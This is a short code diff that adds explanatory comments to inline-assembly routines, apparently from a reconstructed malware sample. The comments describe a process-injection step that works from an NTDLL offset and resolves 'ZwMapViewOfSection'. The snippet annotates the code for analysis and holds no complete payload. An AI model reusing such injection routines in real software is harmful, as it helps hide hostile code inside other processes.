@@ -24,6 +24,11 @@
 /* This entire file seems like one giant function that calls itself to get
 * the addresses for the strings.
 */
+
+// Called during the injection process
+// Argument is the address of ASM Block 
+// 	AKA NTDLL + 16
+// ECX = sASMCodeBlocksHeader( type is ASM_CODE_BLOCKS_HEADER )
 void __declspec(naked) __ASM_BLOCK1_0(void)
 {
 	__asm
@@ -37,7 +42,7 @@ void __declspec(naked) __ASM_BLOCK1_1(void)
 {
 	__asm
 	{
-		pop     edx
+		pop     edx  // EDX = char * "ZwMapViewOfSection"
 		push    ecx
 		add     ecx, 4 // ECX = a vtable?
 		call    __ASM_REF_7
